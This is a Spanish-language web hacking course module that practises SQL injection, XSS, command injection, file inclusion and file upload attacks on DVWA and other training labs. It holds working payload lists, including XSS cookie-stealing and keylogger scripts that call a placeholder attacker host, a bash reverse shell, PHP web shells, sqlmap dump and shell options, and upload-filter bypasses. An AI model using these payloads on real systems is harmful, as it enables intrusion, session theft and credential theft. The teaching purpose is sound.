# MES 2: WEB HACKING - Guía Completa Paso a Paso

## Introducción

El Mes 2 se enfoca en **hacking de aplicaciones web**, que es donde está el 80% del trabajo en ciberseguridad. Aprenderás a encontrar y explotar las vulnerabilidades más comunes.

---

# SEMANA 5: FUNDAMENTOS WEB

## Día 29-30: Cómo Funciona la Web

### Conceptos que DEBES entender

#### 1. Modelo Cliente-Servidor
```
┌─────────────┐         Petición HTTP          ┌─────────────┐
│             │  ─────────────────────────────>│             │
│   CLIENTE   │                                │   SERVIDOR  │
│  (Navegador)│  <─────────────────────────────│    (Web)    │
│             │         Respuesta HTTP         │             │
└─────────────┘                                └─────────────┘

1. Tú escribes: https://google.com
2. Tu navegador envía una PETICIÓN al servidor
3. El servidor procesa la petición
4. El servidor envía una RESPUESTA
5. Tu navegador muestra la página
```

#### 2. Protocolo HTTP

**¿Qué es HTTP?**
HTTP (HyperText Transfer Protocol) es el lenguaje que usan navegadores y servidores para comunicarse.

**Métodos HTTP más importantes:**
```
GET     → Pedir información (cargar una página)
POST    → Enviar información (formularios, login)
PUT     → Actualizar información
DELETE  → Eliminar información
HEAD    → Solo pedir headers (sin contenido)
OPTIONS → Preguntar qué métodos están permitidos
```

#### 3. Anatomía de una URL
```
https://www.ejemplo.com:443/pagina/producto.php?id=123&color=rojo#seccion

│       │               │   │                    │              │
│       │               │   │                    │              └─ Fragment (ancla)
│       │               │   │                    └─ Query String (parámetros)
│       │               │   └─ Path (ruta del recurso)
│       │               └─ Puerto (443 = HTTPS, 80 = HTTP)
│       └─ Dominio
└─ Protocolo (esquema)
```

---

### Práctica: Analizar Peticiones HTTP

#### Instalar y Configurar Burp Suite

**Paso 1: Abrir Burp Suite en Kali**
```bash
# En el menú de Kali, busca "Burp Suite"
# O desde terminal:
burpsuite
```

**Paso 2: Configuración inicial**
```
1. Selecciona "Temporary project" → Next
2. Selecciona "Use Burp defaults" → Start Burp
3. Espera a que cargue
```

**Paso 3: Configurar el proxy del navegador**
```
En Firefox (Kali):
1. Menú ☰ → Settings → busca "proxy"
2. Click en "Settings..." en Network Settings
3. Selecciona "Manual proxy configuration"
4. HTTP Proxy: 127.0.0.1    Port: 8080
5. Marca "Also use this proxy for HTTPS"
6. Click OK
```

**Paso 4: Instalar certificado de Burp**
```
1. Con el proxy configurado, ve a: http://burp
2. Click en "CA Certificate"
3. Guarda el archivo
4. En Firefox: Settings → Privacy & Security → Certificates → View Certificates
5. Import → selecciona el archivo descargado
6. Marca ambas casillas de confianza → OK
```

#### Tu Primera Intercepción

**Paso 1: Activar intercepción**
```
En Burp Suite:
1. Ve a la pestaña "Proxy"
2. Asegúrate que "Intercept is on" (botón azul)
```

**Paso 2: Hacer una petición**
```
1. En Firefox, ve a: http://testphp.vulnweb.com
2. Burp interceptará la petición
3. Verás algo como esto:
```

```http
GET / HTTP/1.1
Host: testphp.vulnweb.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

**Paso 3: Entender cada línea**
```
GET / HTTP/1.1
│   │ │
│   │ └─ Versión de HTTP
│   └─ Ruta (/ = página principal)
└─ Método (GET = pedir página)

Host: testphp.vulnweb.com
└─ Dominio al que va la petición

User-Agent: Mozilla/5.0...
└─ Información de tu navegador

Accept: text/html...
└─ Tipos de contenido que acepta el navegador

Cookie: session=abc123
└─ Cookies (si las hay)
```

**Paso 4: Dejar pasar la petición**
```
Click en "Forward" para enviar la petición
O "Drop" para cancelarla
```

---

## Día 31-32: Anatomía de una Petición/Respuesta

### Petición HTTP Detallada

```http
POST /login.php HTTP/1.1
Host: ejemplo.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Cookie: PHPSESSID=abc123

username=admin&password=123
```

**Partes de la petición:**
```
LÍNEA 1 - Request Line:
POST /login.php HTTP/1.1
│    │          │
│    │          └─ Versión HTTP
│    └─ Recurso solicitado
└─ Método

LÍNEAS 2-6 - Headers:
Host: ejemplo.com              → Servidor destino
User-Agent: Mozilla/5.0        → Info del navegador
Content-Type: application/...  → Tipo de datos enviados
Content-Length: 27             → Tamaño del body
Cookie: PHPSESSID=abc123       → Cookies

LÍNEA 8 - Body (después de línea vacía):
username=admin&password=123    → Datos enviados
```

### Respuesta HTTP Detallada

```http
HTTP/1.1 200 OK
Date: Mon, 29 Jan 2026 10:00:00 GMT
Server: Apache/2.4.41
Content-Type: text/html; charset=UTF-8
Content-Length: 1234
Set-Cookie: session=xyz789; HttpOnly

<!DOCTYPE html>
<html>
<head><title>Bienvenido</title></head>
<body>Login exitoso</body>
</html>
```

**Partes de la respuesta:**
```
LÍNEA 1 - Status Line:
HTTP/1.1 200 OK
│        │   │
│        │   └─ Mensaje de estado
│        └─ Código de estado
└─ Versión HTTP

CÓDIGOS DE ESTADO IMPORTANTES:
200 OK              → Todo bien
301/302 Redirect    → Redirección
400 Bad Request     → Petición mal formada
401 Unauthorized    → Necesita autenticación
403 Forbidden       → Acceso denegado
404 Not Found       → No existe
500 Internal Error  → Error del servidor

HEADERS DE RESPUESTA:
Server: Apache/2.4.41          → Software del servidor (info útil!)
Set-Cookie: session=xyz789     → El servidor crea una cookie
Content-Type: text/html        → Tipo de contenido

BODY:
El contenido HTML de la página
```

---

## Día 33-35: Herramientas del Desarrollador

### Chrome/Firefox DevTools

**Abrir DevTools:**
```
F12 o Click derecho → Inspeccionar
```

**Pestañas importantes:**

#### 1. Elements (Elementos)
```
- Ver el HTML de la página
- Modificar elementos en tiempo real
- Buscar campos ocultos
- Encontrar comentarios en el código
```

**Ejercicio:**
```
1. Ve a cualquier página con formulario de login
2. Abre DevTools (F12)
3. Busca el formulario en Elements
4. Mira los campos: ¿hay campos "hidden"?
5. ¿Hay comentarios <!-- --> con información?
```

#### 2. Network (Red)
```
- Ver todas las peticiones HTTP
- Analizar headers
- Ver tiempos de respuesta
- Copiar peticiones como cURL
```

**Ejercicio:**
```
1. Abre DevTools → Network
2. Marca "Preserve log"
3. Haz login en algún sitio de prueba
4. Busca la petición POST del login
5. Click derecho → Copy → Copy as cURL
```

#### 3. Console (Consola)
```
- Ejecutar JavaScript
- Ver errores
- Manipular la página
```

**Ejercicio:**
```javascript
// En la consola, prueba:
document.cookie                    // Ver cookies
document.forms                     // Ver formularios
document.querySelectorAll('input') // Ver inputs
```

#### 4. Application (Aplicación)
```
- Ver cookies
- Ver localStorage
- Ver sessionStorage
- Ver Service Workers
```

**Ejercicio:**
```
1. Ve a Application → Cookies
2. Observa las cookies del sitio
3. ¿Cuáles parecen ser de sesión?
4. ¿Tienen flag HttpOnly o Secure?
```

---

# SEMANA 6: SQL INJECTION (SQLi)

## Día 36-37: Fundamentos de SQL

### ¿Qué es SQL?

SQL (Structured Query Language) es el lenguaje para hablar con bases de datos.

### Comandos SQL Básicos

```sql
-- SELECCIONAR datos
SELECT * FROM usuarios;
SELECT nombre, email FROM usuarios;
SELECT * FROM usuarios WHERE id = 1;
SELECT * FROM usuarios WHERE nombre = 'admin';

-- INSERTAR datos
INSERT INTO usuarios (nombre, password) VALUES ('juan', '123456');

-- ACTUALIZAR datos
UPDATE usuarios SET password = 'nuevo123' WHERE id = 1;

-- ELIMINAR datos
DELETE FROM usuarios WHERE id = 5;

-- OPERADORES
SELECT * FROM usuarios WHERE id = 1 AND activo = 1;
SELECT * FROM usuarios WHERE rol = 'admin' OR rol = 'moderador';
SELECT * FROM productos WHERE precio > 100;

-- COMENTARIOS (importantes para inyección)
SELECT * FROM usuarios; -- esto es un comentario
SELECT * FROM usuarios; # esto también (MySQL)
SELECT * FROM usuarios; /* comentario de bloque */
```

### Practica SQL Online

**Usa este sitio para practicar:**
```
https://www.w3schools.com/sql/trysql.asp?filename=trysql_select_all
```

**Ejercicios:**
```sql
-- 1. Selecciona todos los clientes
SELECT * FROM Customers;

-- 2. Selecciona solo clientes de Germany
SELECT * FROM Customers WHERE Country = 'Germany';

-- 3. Selecciona clientes cuyo nombre empiece con 'A'
SELECT * FROM Customers WHERE CustomerName LIKE 'A%';

-- 4. Cuenta cuántos clientes hay
SELECT COUNT(*) FROM Customers;

-- 5. Une dos tablas
SELECT * FROM Orders 
INNER JOIN Customers ON Orders.CustomerID = Customers.CustomerID;
```

---

## Día 38-40: SQL Injection - Teoría

### ¿Qué es SQL Injection?

SQL Injection ocurre cuando puedes **insertar código SQL** en una consulta que el servidor ejecuta.

### Ejemplo de Código Vulnerable

**PHP vulnerable:**
```php
<?php
// El usuario envía: id=1
$id = $_GET['id'];

// La consulta se construye así:
$query = "SELECT * FROM productos WHERE id = " . $id;

// Si id=1, la consulta es:
// SELECT * FROM productos WHERE id = 1
// ¡Correcto!

// PERO si el usuario envía: id=1 OR 1=1
// La consulta se convierte en:
// SELECT * FROM productos WHERE id = 1 OR 1=1
// ¡Esto devuelve TODOS los productos!
?>
```

### Tipos de SQL Injection

#### 1. In-Band SQLi (Clásico)
```
El resultado de la inyección se ve directamente en la página.

Subtipos:
- Error-based: Los errores SQL revelan información
- UNION-based: Usas UNION para extraer datos
```

#### 2. Blind SQLi (A ciegas)
```
No ves el resultado directamente, pero puedes inferirlo.

Subtipos:
- Boolean-based: La página cambia según true/false
- Time-based: El servidor tarda más según la condición
```

#### 3. Out-of-Band SQLi
```
Los datos se extraen por otro canal (DNS, HTTP externo).
Más avanzado, menos común.
```

---

## Día 41-42: SQL Injection - Práctica en DVWA

### Preparar DVWA

```bash
# Si no está corriendo, inicia DVWA
docker run -d -p 80:80 vulnerables/web-dvwa

# Accede a: http://localhost
# Login: admin / password
# Ve a DVWA Security → Low
# Ve a SQL Injection
```

### Nivel LOW - Paso a Paso

**Página:** SQL Injection en DVWA

**El formulario pide:** User ID

**Paso 1: Probar funcionamiento normal**
```
Ingresa: 1
Click Submit

Resultado:
ID: 1
First name: admin
Surname: admin
```

**Paso 2: Probar si es vulnerable**
```
Ingresa: 1'
Click Submit

Resultado: Error de SQL
"You have an error in your SQL syntax..."

¡VULNERABLE! El apóstrofe rompe la consulta.
```

**Paso 3: Entender la consulta**
```sql
-- La consulta original probablemente es:
SELECT first_name, last_name FROM users WHERE user_id = '1'

-- Cuando ponemos 1', se convierte en:
SELECT first_name, last_name FROM users WHERE user_id = '1''
-- El apóstrofe extra causa error
```

**Paso 4: Cerrar la consulta correctamente**
```
Ingresa: 1' OR '1'='1

La consulta se convierte en:
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1'

'1'='1' siempre es verdadero, así que devuelve TODOS los usuarios.
```

**Paso 5: Usar comentarios para ignorar el resto**
```
Ingresa: 1' OR 1=1 -- -

La consulta:
SELECT first_name, last_name FROM users WHERE user_id = '1' OR 1=1 -- -'

Todo después de -- es comentario, se ignora.
```

**Paso 6: Descubrir número de columnas (para UNION)**
```
Ingresa: 1' ORDER BY 1 -- -
→ Funciona

Ingresa: 1' ORDER BY 2 -- -
→ Funciona

Ingresa: 1' ORDER BY 3 -- -
→ Error! Solo hay 2 columnas.
```

**Paso 7: Extraer datos con UNION**
```
Ingresa: 1' UNION SELECT 1,2 -- -

Verás:
ID: 1
First name: 1
Surname: 2

Los números 1 y 2 aparecen. Podemos reemplazarlos con datos reales.
```

**Paso 8: Extraer versión de la base de datos**
```
Ingresa: 1' UNION SELECT version(),database() -- -

Verás:
First name: 10.3.22-MariaDB-1ubuntu1
Surname: dvwa

¡Ahora sabemos la versión y nombre de la base de datos!
```

**Paso 9: Listar todas las tablas**
```
Ingresa: 1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema='dvwa' -- -

Verás las tablas:
- guestbook
- users
```

**Paso 10: Listar columnas de la tabla users**
```
Ingresa: 1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users' -- -

Verás columnas:
- user_id
- first_name
- last_name
- user
- password
- avatar
- last_login
- failed_login
```

**Paso 11: Extraer usuarios y contraseñas**
```
Ingresa: 1' UNION SELECT user,password FROM users -- -

Verás:
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

(etc...)
```

**Paso 12: Crackear los hashes**
```
Los hashes son MD5. Ve a:
https://crackstation.net

Pega: 5f4dcc3b5aa765d61d8327deb882cf99
Resultado: password

Pega: e99a18c428cb38d5f260853678922e03
Resultado: abc123
```

### Resumen de Payloads SQLi

```sql
-- Detectar vulnerabilidad
'
''
' OR '1'='1
' OR 1=1 -- -
" OR "" = "

-- Descubrir columnas
' ORDER BY 1 -- -
' ORDER BY 2 -- -
' ORDER BY 3 -- -

-- UNION básico
' UNION SELECT 1,2 -- -
' UNION SELECT null,null -- -

-- Extraer información
' UNION SELECT version(),database() -- -
' UNION SELECT user(),@@version -- -

-- Listar tablas
' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database() -- -

-- Listar columnas
' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users' -- -

-- Extraer datos
' UNION SELECT username,password FROM users -- -
```

---

## Día 43: SQLMap - Automatización

### ¿Qué es SQLMap?

SQLMap automatiza la detección y explotación de SQL Injection.

### Uso Básico

```bash
# Sintaxis básica
sqlmap -u "URL_CON_PARAMETRO"

# Ejemplo con DVWA
# Primero, obtén tu cookie de sesión de DVWA
# En el navegador: F12 → Application → Cookies
# Copia el valor de PHPSESSID

sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=tu_cookie_aqui;security=low"
```

### Comandos SQLMap Paso a Paso

```bash
# ══════════════════════════════════════════════
# PASO 1: Detectar vulnerabilidad
# ══════════════════════════════════════════════
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=abc123;security=low"

# SQLMap probará automáticamente y te dirá si es vulnerable


# ══════════════════════════════════════════════
# PASO 2: Listar bases de datos
# ══════════════════════════════════════════════
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=abc123;security=low" \
       --dbs

# Resultado: dvwa, information_schema


# ══════════════════════════════════════════════
# PASO 3: Listar tablas de una base de datos
# ══════════════════════════════════════════════
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=abc123;security=low" \
       -D dvwa --tables

# Resultado: guestbook, users


# ══════════════════════════════════════════════
# PASO 4: Listar columnas de una tabla
# ══════════════════════════════════════════════
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=abc123;security=low" \
       -D dvwa -T users --columns

# Resultado: user_id, user, password, etc.


# ══════════════════════════════════════════════
# PASO 5: Extraer datos (dump)
# ══════════════════════════════════════════════
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=abc123;security=low" \
       -D dvwa -T users --dump

# ¡Extrae todos los usuarios y contraseñas!
# SQLMap incluso intenta crackear los hashes automáticamente
```

### Opciones Útiles de SQLMap

```bash
# Nivel de pruebas (1-5, más alto = más pruebas)
--level=3

# Riesgo (1-3, más alto = pruebas más intrusivas)
--risk=2

# Especificar parámetro a probar
-p "id"

# Usar técnicas específicas
--technique=U   # Solo UNION
--technique=B   # Solo Boolean blind
--technique=T   # Solo Time blind

# Obtener shell del sistema (si es posible)
--os-shell

# Obtener shell SQL
--sql-shell

# Leer archivos del servidor
--file-read="/etc/passwd"

# Bypass de WAF
--tamper=space2comment

# Ser más sigiloso
--random-agent
--delay=1
```

---

# SEMANA 7: CROSS-SITE SCRIPTING (XSS)

## Día 44-45: Fundamentos de XSS

### ¿Qué es XSS?

XSS (Cross-Site Scripting) permite **inyectar código JavaScript** en páginas web que otros usuarios verán.

### ¿Por qué es peligroso?

```javascript
// Con XSS puedes:
1. Robar cookies de sesión
2. Redirigir usuarios a sitios maliciosos
3. Modificar el contenido de la página
4. Capturar teclas (keylogger)
5. Hacer acciones como si fueras el usuario
```

### Tipos de XSS

#### 1. XSS Reflejado (Reflected)
```
- El payload está en la URL
- Se ejecuta cuando la víctima hace clic
- No se guarda en el servidor

Ejemplo:
http://ejemplo.com/buscar?q=<script>alert('XSS')</script>
```

#### 2. XSS Almacenado (Stored)
```
- El payload se guarda en la base de datos
- Se ejecuta cada vez que alguien ve la página
- Más peligroso

Ejemplo:
Un comentario malicioso en un blog que todos ven
```

#### 3. XSS Basado en DOM
```
- El payload modifica el DOM del navegador
- No pasa por el servidor
- JavaScript del cliente procesa datos no sanitizados
```

---

## Día 46-48: XSS Práctica en DVWA

### XSS Reflejado (Reflected) - Nivel LOW

**Ir a:** DVWA → XSS (Reflected)

**Paso 1: Probar funcionamiento normal**
```
Ingresa tu nombre: Juan
Click Submit
Verás: Hello Juan
```

**Paso 2: Probar XSS básico**
```
Ingresa: <script>alert('XSS')</script>
Click Submit

¡Aparece una alerta! El código JavaScript se ejecutó.
```

**Paso 3: Probar otros payloads**
```html
<!-- Alert con document.domain -->
<script>alert(document.domain)</script>

<!-- Mostrar cookies -->
<script>alert(document.cookie)</script>

<!-- Sin tags script -->
<img src=x onerror=alert('XSS')>

<!-- Con evento onload -->
<body onload=alert('XSS')>

<!-- Con SVG -->
<svg onload=alert('XSS')>

<!-- Con iframe -->
<iframe src="javascript:alert('XSS')">
```

**Paso 4: Robar cookies (simulación)**
```javascript
// Este payload enviaría la cookie a tu servidor
<script>
new Image().src='http://TU_IP:8000/steal?cookie='+document.cookie;
</script>

// Para probar, abre un servidor en tu Kali:
python3 -m http.server 8000

// Luego inyecta el payload y verás la cookie en tu terminal
```

---

### XSS Almacenado (Stored) - Nivel LOW

**Ir a:** DVWA → XSS (Stored)

**Paso 1: Entender la página**
```
Es un libro de visitas (guestbook)
Los mensajes se guardan y todos los ven
```

**Paso 2: Publicar XSS**
```
Name: Hacker
Message: <script>alert('XSS Almacenado!')</script>
Click "Sign Guestbook"
```

**Paso 3: Verificar**
```
Recarga la página
La alerta aparece cada vez que alguien visita
¡El XSS está almacenado en la base de datos!
```

**Paso 4: Payload más elaborado**
```html
Name: Test
Message: <script>document.body.innerHTML='<h1>Página Hackeada</h1>'</script>

Este payload reemplaza todo el contenido de la página
```

---

### Payloads XSS Útiles

```html
<!-- ═══════════════════════════════════════ -->
<!-- BÁSICOS -->
<!-- ═══════════════════════════════════════ -->
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- ═══════════════════════════════════════ -->
<!-- SIN TAGS <script> -->
<!-- ═══════════════════════════════════════ -->
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<video src=x onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>

<!-- ═══════════════════════════════════════ -->
<!-- BYPASS DE FILTROS -->
<!-- ═══════════════════════════════════════ -->
<!-- Mayúsculas/minúsculas mezcladas -->
<ScRiPt>alert('XSS')</ScRiPt>

<!-- Codificación HTML -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Codificación URL -->
<script>alert%28%27XSS%27%29</script>

<!-- Espacios alternativos -->
<script>alert('XSS')</script>

<!-- Sin comillas -->
<script>alert(document.domain)</script>

<!-- Con backticks -->
<script>alert`XSS`</script>

<!-- ═══════════════════════════════════════ -->
<!-- ROBO DE COOKIES -->
<!-- ═══════════════════════════════════════ -->
<script>
fetch('http://ATACANTE/steal?c='+document.cookie)
</script>

<script>
new Image().src='http://ATACANTE/steal?c='+document.cookie
</script>

<img src=x onerror="this.src='http://ATACANTE/steal?c='+document.cookie">

<!-- ═══════════════════════════════════════ -->
<!-- KEYLOGGER -->
<!-- ═══════════════════════════════════════ -->
<script>
document.onkeypress=function(e){
  fetch('http://ATACANTE/log?k='+e.key)
}
</script>

<!-- ═══════════════════════════════════════ -->
<!-- PHISHING (mostrar formulario falso) -->
<!-- ═══════════════════════════════════════ -->
<script>
document.body.innerHTML='<h1>Sesión expirada</h1><form action="http://ATACANTE/capture"><input name="user" placeholder="Usuario"><input name="pass" type="password" placeholder="Contraseña"><button>Login</button></form>'
</script>
```

---

## Día 49: XSS en PortSwigger Academy

### Registrarse y Practicar

**Paso 1: Crear cuenta**
```
1. Ve a: https://portswigger.net/web-security
2. Crea una cuenta gratuita
3. Ve a: All labs → Cross-site scripting
```

**Paso 2: Completar labs de XSS**
```
Empieza por estos (en orden):
1. "Reflected XSS into HTML context with nothing encoded"
2. "Stored XSS into HTML context with nothing encoded"
3. "DOM XSS in document.write sink using source location.search"
4. "Reflected XSS into attribute with angle brackets HTML-encoded"
5. "Stored XSS into anchor href attribute with double quotes HTML-encoded"
```

---

# SEMANA 8: MÁS VULNERABILIDADES WEB

## Día 50-51: Command Injection

### ¿Qué es Command Injection?

Permite ejecutar comandos del sistema operativo en el servidor.

### Práctica en DVWA

**Ir a:** DVWA → Command Injection

**Paso 1: Uso normal**
```
Ingresa IP: 127.0.0.1
Click Submit
Verás resultado de ping
```

**Paso 2: Inyectar comandos**
```bash
# En Linux, podemos encadenar comandos con ; | || && 

Ingresa: 127.0.0.1; whoami
# Ejecuta ping Y luego whoami

Ingresa: 127.0.0.1 && cat /etc/passwd
# Ejecuta ping Y luego lee el archivo passwd

Ingresa: 127.0.0.1 | ls -la
# El resultado de ping se pasa a ls (pero ls lo ignora)

Ingresa: || ls
# Si ping falla, ejecuta ls
```

**Paso 3: Comandos útiles**
```bash
# Ver usuario actual
; whoami

# Ver directorio actual
; pwd

# Listar archivos
; ls -la

# Ver archivos sensibles
; cat /etc/passwd
; cat /etc/shadow  # Probablemente no tengas permiso

# Información del sistema
; uname -a
; id

# Conexiones de red
; netstat -an

# Reverse shell (si funciona)
; bash -i >& /dev/tcp/TU_IP/4444 0>&1
```

---

## Día 52-53: File Inclusion (LFI/RFI)

### Local File Inclusion (LFI)

Permite leer archivos del servidor.

### Práctica en DVWA

**Ir a:** DVWA → File Inclusion

**Paso 1: Observar la URL**
```
http://localhost/vulnerabilities/fi/?page=include.php

El parámetro "page" carga un archivo
```

**Paso 2: Leer archivos locales**
```
# Leer /etc/passwd
?page=/etc/passwd

# Si no funciona, usa path traversal
?page=../../../etc/passwd
?page=....//....//....//etc/passwd

# En Windows
?page=C:\Windows\System32\drivers\etc\hosts
?page=..\..\..\..\Windows\System32\drivers\etc\hosts
```

**Paso 3: Path Traversal explicado**
```
La aplicación espera:
/var/www/html/vulnerabilities/fi/include.php

Si ponemos ../../etc/passwd:
/var/www/html/vulnerabilities/fi/../../etc/passwd
= /var/www/html/vulnerabilities/etc/passwd  (no existe)

Necesitamos más ../
../../../etc/passwd
= /var/www/html/etc/passwd (no existe)

../../../../etc/passwd
= /var/www/etc/passwd (no existe)

../../../../../etc/passwd
= /etc/passwd ¡EXISTE!
```

**Paso 4: Archivos interesantes en Linux**
```
/etc/passwd           → Usuarios del sistema
/etc/shadow           → Hashes de contraseñas (requiere root)
/etc/hosts            → Hosts locales
/etc/hostname         → Nombre del servidor
/proc/self/environ    → Variables de entorno
/var/log/apache2/access.log  → Logs de Apache
/var/log/auth.log     → Logs de autenticación
~/.bash_history       → Historial de comandos
~/.ssh/id_rsa         → Clave SSH privada
```

---

## Día 54-55: File Upload Vulnerabilities

### ¿Qué es?

Subir archivos maliciosos que el servidor ejecuta.

### Práctica en DVWA

**Ir a:** DVWA → File Upload

**Paso 1: Crear un shell PHP**
```bash
# Crear archivo shell.php
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Paso 2: Subir el archivo**
```
1. Click en "Browse"
2. Selecciona shell.php
3. Click en "Upload"
4. Verás: "../../hackable/uploads/shell.php succesfully uploaded!"
```

**Paso 3: Usar el shell**
```
Visita:
http://localhost/hackable/uploads/shell.php?cmd=whoami

¡Verás el usuario del servidor!

Prueba más comandos:
?cmd=ls -la
?cmd=cat /etc/passwd
?cmd=uname -a
```

**Paso 4: Shell más elaborado**
```php
<?php
// shell_avanzado.php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
}
?>

// Uso: ?cmd=id
```

### Bypasses de Filtros

```bash
# Si bloquea .php, prueba otras extensiones
shell.php3
shell.php4
shell.php5
shell.phtml
shell.phar

# Doble extensión
shell.php.jpg
shell.jpg.php

# Null byte (versiones antiguas de PHP)
shell.php%00.jpg

# Cambiar Content-Type
En Burp, cambia:
Content-Type: application/x-php
a
Content-Type: image/jpeg
```

---

## Día 56: Repaso y Proyecto Final del Mes

### Proyecto: Auditoría Web Completa

**Objetivo:** Hacer una auditoría completa de DVWA documentando todo.

**Plantilla de Reporte:**

```markdown
# Reporte de Auditoría de Seguridad

## Información General
- **Objetivo:** DVWA (Damn Vulnerable Web Application)
- **Fecha:** [fecha]
- **Auditor:** [tu nombre]
- **Alcance:** Todas las vulnerabilidades disponibles

## Resumen Ejecutivo
Se encontraron X vulnerabilidades:
- Críticas: X
- Altas: X
- Medias: X
- Bajas: X

## Vulnerabilidades Encontradas

### 1. SQL Injection
**Severidad:** Crítica
**Ubicación:** /vulnerabilities/sqli/
**Descripción:** El parámetro 'id' es vulnerable a SQL Injection.
**Prueba de Concepto:**
```
Payload: 1' UNION SELECT user,password FROM users -- -
```
**Impacto:** Acceso completo a la base de datos.
**Recomendación:** Usar consultas preparadas (prepared statements).

### 2. XSS Reflejado
**Severidad:** Alta
**Ubicación:** /vulnerabilities/xss_r/
**Descripción:** El parámetro 'name' no sanitiza entrada.
**Prueba de Concepto:**
```
Payload: <script>alert(document.cookie)</script>
```
**Impacto:** Robo de sesiones, phishing.
**Recomendación:** Sanitizar y encodear salida.

[Continuar con cada vulnerabilidad...]
```

---

## Checklist del Mes 2

### Semana 5: Fundamentos Web
- [ ] Entiendo el modelo cliente-servidor
- [ ] Conozco los métodos HTTP (GET, POST, etc.)
- [ ] Sé interpretar códigos de estado (200, 404, 500...)
- [ ] Puedo usar Burp Suite para interceptar tráfico
- [ ] Sé usar las DevTools del navegador

### Semana 6: SQL Injection
- [ ] Entiendo cómo funciona SQL básico
- [ ] Puedo detectar vulnerabilidades SQLi manualmente
- [ ] Puedo extraer datos con UNION
- [ ] Sé usar SQLMap
- [ ] Completé al menos 3 labs de PortSwigger

### Semana 7: XSS
- [ ] Entiendo los 3 tipos de XSS
- [ ] Puedo crear payloads XSS básicos
- [ ] Conozco técnicas de bypass de filtros
- [ ] Completé XSS en DVWA (todos los niveles)
- [ ] Completé al menos 3 labs de PortSwigger

### Semana 8: Otras Vulnerabilidades
- [ ] Puedo explotar Command Injection
- [ ] Entiendo LFI y Path Traversal
- [ ] Puedo subir shells PHP
- [ ] Hice el proyecto de auditoría completa

---

## Recursos del Mes 2

### Labs Obligatorios
```
1. DVWA - Todas las vulnerabilidades en nivel Low y Medium
2. PortSwigger Academy - SQL Injection (primeros 5 labs)
3. PortSwigger Academy - XSS (primeros 5 labs)
4. TryHackMe - "OWASP Top 10" room
5. TryHackMe - "SQL Injection" room
```

### Lecturas Recomendadas
```
1. OWASP Testing Guide - Capítulos de SQLi y XSS
2. PortSwigger - SQL Injection cheat sheet
3. HackTricks - Web Pentesting section
```

### Videos Recomendados
```
1. IppSec - Cualquier video sobre máquinas web
2. John Hammond - Web hacking videos
3. LiveOverflow - Web security series
```

---

## Próximo Mes: Mes 3 - Explotación y Post-Explotación

```
Vista previa:
- Metasploit Framework completo
- Shells reversas y bind shells
- Escalada de privilegios en Linux
- Escalada de privilegios en Windows
- Movimiento lateral
- Máquinas de HackTheBox
```

---

*¡Felicidades por completar el Mes 2! Ahora tienes bases sólidas en web hacking.*
